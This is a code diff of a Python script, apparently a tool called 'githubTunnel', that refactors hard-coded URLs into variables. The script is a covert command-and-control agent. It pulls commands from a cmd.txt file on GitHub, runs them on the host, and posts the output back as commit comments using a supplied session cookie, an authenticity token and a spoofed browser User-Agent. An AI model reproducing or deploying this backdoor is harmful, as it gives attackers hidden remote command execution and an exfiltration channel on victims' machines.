@@ -19,13 +19,15 @@ except:
     from urllib.request import Request
 import random
 
-
-
 from time import sleep
+
+control_url = "https://github.com/Lonely-night/githubTunnel/blob/master/cmd.txt"
+response_url = "https://github.com/Lonely-night/githubTunnel/commit_comment/create"
+commit_id = "41811231fd220ae9af2038ec1fcbb50819aaedf9"
 
 
 def get_cmd():
-    request = Request("https://github.com/Lonely-night/githubTunnel/blob/master/cmd.txt")
+    request = Request(control_url)
     request.add_header('content-TYPE', 'application/x-www-form-urlencoded')
     response = urlopen(request)
     data = response.read()
@@ -44,7 +46,7 @@ def run_cmd(cmd):
 
 
 def upload_result(session, token, result):
-    request = Request("https://github.com/Lonely-night/githubTunnel/commit_comment/create")
+    request = Request(response_url)
     request.add_header('Content-Type', 'application/x-www-form-urlencoded')
     request.add_header('X-Requested-With', 'XMLHttpRequest')
     request.add_header('Accept', 'application/json')
@@ -52,7 +54,7 @@ def upload_result(session, token, result):
     request.add_header('User-Agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:72.0)')
     request.add_header('Cookie', 'user_session={session}; __Host-user_session_same_site={session};'.format(session=session))
     data = {"authenticity_token": token,
-            "commit_id": "41811231fd220ae9af2038ec1fcbb50819aaedf9",
+            "commit_id": commit_id,
             "comment[body]": result
          }
     response = urlopen(request, urlencode(data).encode('utf-8'))
